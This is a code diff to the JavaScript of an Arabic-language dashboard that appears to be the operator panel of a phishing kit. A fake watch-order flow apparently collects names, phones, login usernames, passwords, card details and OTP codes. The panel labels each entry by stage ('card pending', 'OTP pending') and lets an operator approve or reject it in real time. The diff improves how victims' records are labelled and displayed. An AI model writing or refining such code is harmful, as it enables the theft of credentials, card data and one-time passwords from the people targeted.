@@ -315,8 +315,16 @@ const PL={home:'الرئيسية',index:'الرئيسية',order:'صفحة ال�
   waiting:'بانتظار الموافقة',code:'رمز التحقق','code-waiting':'بانتظار الرمز',success:'مكتمل'};
 const PC={home:'#6b7280',index:'#6b7280',order:'#0ea5e9',login:'#0891b2',password:'#a855f7',
   waiting:'#7c3aed',code:'#d97706','code-waiting':'#f59e0b',success:'#16a34a'};
-const SL={pending:'قيد الانتظار',confirmed:'مقبول',rejected:'مرفوض',
-  code_pending:'بانتظار الرمز',code_confirmed:'تم التأكيد',code_rejected:'رمز مرفوض'};
+function statusLabel(o){
+  if(o.status==='confirmed') return 'مقبول';
+  if(o.status==='rejected') return 'مرفوض';
+  if(o.status==='code_confirmed') return 'تم التأكيد';
+  if(o.status==='code_rejected') return 'رمز مرفوض';
+  var pg=o.current_page||'';
+  if(o.status==='code_pending'||pg==='code'||pg==='code-waiting') return 'OTP قيد الانتظار';
+  if(pg==='login'||pg==='password'||pg==='waiting') return 'بطاقة قيد الانتظار';
+  return 'بيانات جديدة';
+}
 
 let TOKEN=localStorage.getItem('admin_token')||'',orders=[],visitors=[],allVisitors=[],
     selId=null,sQ='',prevIds=new Set(),delConfId=null,detDelConf=false;
@@ -405,7 +413,7 @@ function renderActive(){
   el.innerHTML=list.map(o=>{
     const otp=o.verification_code?`<span class="otp">OTP: ${esc(o.verification_code)}</span>`:'';
     return `<div class="ac${o.id===selId?' sel':''}" onclick="selectOrder(${o.id})">
-      <div class="ac-t"><span class="ac-n">${esc(o.name)||'مجهول'}</span>${pgBadge(o.current_page)}</div>
+      <div class="ac-t"><span class="ac-n">${esc(o.name)||esc(o.login_username)||esc(o.phone)||'—'}</span>${pgBadge(o.current_page)}</div>
       <div class="ac-info">${o.phone?`<span>📱 ${esc(o.phone)}</span>`:''}${otp}</div></div>`;
   }).join('');
 }
@@ -421,7 +429,7 @@ function renderOrders(){
     const otp=o.verification_code?`<div class="oc-otp">📲 OTP: ${esc(o.verification_code)}</div>`:'';
     const isDC=delConfId===o.id;
     return `<div class="oc${o.id===selId?' sel':''}" onclick="selectOrder(${o.id})">
-      <div class="oc-t"><div class="oc-nm">${on}<span>${esc(o.name)||'مجهول'}</span></div>${pgBadge(o.current_page)}</div>
+      <div class="oc-t"><div class="oc-nm">${on}<span>${esc(o.name)||esc(o.login_username)||esc(o.phone)||'—'}</span></div>${pgBadge(o.current_page)}</div>
       <div class="oc-info">📱 ${esc(o.phone)||'—'} • 🕐 ${fmtDate(o.created_at)}</div>
       ${otp}
       <button class="oc-del ${isDC?'confirm':'normal'}" onclick="event.stopPropagation();oDel(${o.id})">${isDC?'⚠️ تأكيد':'✕'}</button>
@@ -448,7 +456,7 @@ function renderDetail(o){
 
   // HEADER
   h+=`<div class="dh"><div class="dh-left"><div class="dh-av">👤</div><div>
-    <div class="dh-name">${esc(o.name)||'مجهول'}</div>
+    <div class="dh-name">${esc(o.name)||esc(o.login_username)||esc(o.phone)||'—'}</div>
     <div class="dh-meta"><span class="pg-badge" style="background:${p}">${pl}</span>
     <span class="dh-time">🕐 ${fmtDate(o.created_at)}</span></div></div></div>
     <button class="dh-del ${detDelConf?'confirm':'normal'}" onclick="detDel(${o.id})">${detDelConf?'⚠️ تأكيد':'🗑️ حذف'}</button></div>`;
@@ -470,7 +478,7 @@ function renderDetail(o){
     {icon:'📲',label:'رمز التحقق',value:o.verification_code,color:'#f59e0b',hl:true},
     {icon:'🎨',label:'لون الساعة',value:o.watch_color,color:'#8b5cf6'},
     {icon:'📍',label:'الصفحة الحالية',value:pl,color:'#6b7280'},
-    {icon:'📊',label:'الحالة',value:SL[o.status]||o.status,color:'#6b7280'}
+    {icon:'📊',label:'الحالة',value:statusLabel(o),color:'#6b7280'}
   ].filter(d=>d.value&&d.value!=='-'&&d.value!=='—');
 
   h+=`<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">`;
